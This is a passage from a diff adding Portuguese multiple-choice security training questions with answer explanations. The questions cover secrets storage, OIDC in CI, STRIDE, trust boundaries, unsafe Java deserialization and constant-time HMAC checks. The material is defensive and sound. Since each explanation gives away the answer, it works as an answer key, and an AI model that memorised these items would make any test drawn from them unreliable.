+      "No Dockerfile, como instrução ENV, para ir junto com a imagem",
+      "Em um arquivo .env commitado em um repositório privado",
+      "Hardcoded no código-fonte, mas ofuscada com base64",
+      "Em um secrets manager, injetada em runtime só para esse serviço"
+    ],
+    "explanation": "Um secrets manager oferece controle de acesso, logs de auditoria e rotação, e a injeção em runtime mantém o segredo fora das imagens e do código-fonte. Valores ENV ficam gravados nas camadas da imagem, que qualquer um com a imagem pode ler, repositórios privados ainda são amplamente clonados, e base64 é encoding, não proteção."
+  },
+  {
+    "id": "sec-secrets-ci-oidc",
+    "title": "Removendo chaves de nuvem de longa duração do CI",
+    "question": "Um pipeline de CI faz deploy na nuvem usando uma chave de acesso de longa duração, com permissões amplas, guardada como secret do CI. Qual é o design melhor?",
+    "options": [
+      "Rotacionar a chave todo mês e mantê-la guardada como secret mascarado do CI",
+      "Criptografar a chave com uma passphrase guardada em um segundo secret do CI",
+      "Federação OIDC, trocando um token do job por credenciais de curta duração",
+      "Mover a chave para o arquivo de config criptografado do repositório usado no deploy"
+    ],
+    "explanation": "Com OIDC, o provedor de CI emite um token que descreve o repositório, o branch e o ambiente, e a trust policy da nuvem concede uma role por pouco tempo apenas a claims correspondentes. Não existe segredo estático para vazar, e as permissões podem ter escopo por job. A rotação reduz a exposição, mas mantém uma chave permanente, e criptografar a chave só muda o segredo de lugar."
+  },
+  {
+    "id": "sec-threat-stride-tampering",
+    "title": "Classificando uma ameaça com STRIDE",
+    "question": "Durante a modelagem de ameaças, você nota que um atacante na rede interna poderia modificar os totais de pedidos em trânsito entre dois serviços. Qual categoria STRIDE é essa?",
+    "options": [
+      "Spoofing",
+      "Tampering",
+      "Repudiation",
+      "Information disclosure"
+    ],
+    "explanation": "Tampering é a modificação não autorizada de dados, em repouso ou em trânsito; TLS mútuo ou assinatura de mensagens a mitigam. Spoofing é se passar por outra pessoa, repudiation é negar uma ação sem que haja prova, e information disclosure é ler dados que você não deveria ver."
+  },
+  {
+    "id": "sec-threat-trust-boundaries",
+    "title": "Onde focar em um diagrama de fluxo de dados",
+    "question": "Seu time desenhou um diagrama de fluxo de dados de uma nova funcionalidade de pagamentos. Onde a análise de ameaças deve focar primeiro?",
+    "options": [
+      "Fluxos que cruzam fronteiras de confiança, como internet para API ou API para terceiros",
+      "Chamadas de função internas de um único serviço, onde a maioria dos bugs é encontrada",
+      "Componentes com mais mudanças de código na última sprint",
+      "Tabelas do banco que armazenam o maior volume de linhas"
+    ],
+    "explanation": "Fronteiras de confiança marcam onde os dados passam entre áreas com privilégios ou donos diferentes, que é onde decisões de autenticação, autorização, validação e criptografia importam e por onde os atacantes entram. Chamadas dentro de uma mesma zona de confiança, volume de mudanças no código e tamanho de tabelas são sinais mais fracos de superfície de ataque."
+  },
+  {
+    "id": "sec-coding-deserialization",
+    "title": "Desserializando dados não confiáveis",
+    "question": "Um serviço Java aceita um blob em base64 dos clientes e o restaura com ObjectInputStream.readObject(). Qual é o principal risco e a solução?",
+    "options": [
+      "O blob pode ser grande demais; limite o tamanho e o readObject() fica seguro",
+      "Base64 pode ser adulterado; troque para encoding hex antes de desserializar",
+      "Objetos desserializados podem estar velhos; adicione versão e rejeite os antigos",
+      "Gadget chains podem levar a RCE; aceite um formato só de dados, como JSON"
+    ],
+    "explanation": "A desserialização nativa instancia classes arbitrárias do classpath e executa seus callbacks, então grafos de objetos forjados podem encadear código de bibliotecas até a execução de comandos antes que seu código inspecione o resultado. Limites de tamanho e encodings não mudam isso; evite serialização nativa para entrada não confiável ou, no mínimo, use filtros estritos de allow-list de classes."
+  },
+  {
+    "id": "sec-coding-constant-time-compare",
+    "title": "Comparando assinaturas de webhook",
+    "question": "Um handler de webhook calcula um HMAC e o verifica com `if computed == request_signature:`. O que está errado e como corrigir em Python?",
+    "options": [
+      "== compara identidade de objeto em strings; use computed.equals(request_signature)",
+      "HMACs precisam ser decifrados antes da comparação; use hmac.decrypt antes",
+      "A comparação com saída antecipada vaza tempo; use hmac.compare_digest",
+      "A comparação diferencia maiúsculas; converta os dois valores para minúsculas"
+    ],
+    "explanation": "Uma comparação normal retorna assim que um byte difere, então o tempo de resposta pode revelar quantos bytes iniciais estão corretos e permitir adivinhar uma assinatura aos poucos. hmac.compare_digest leva um tempo independente de onde está a diferença. Em Python, == compara valores, e HMACs não são criptografados."
+  }
+]
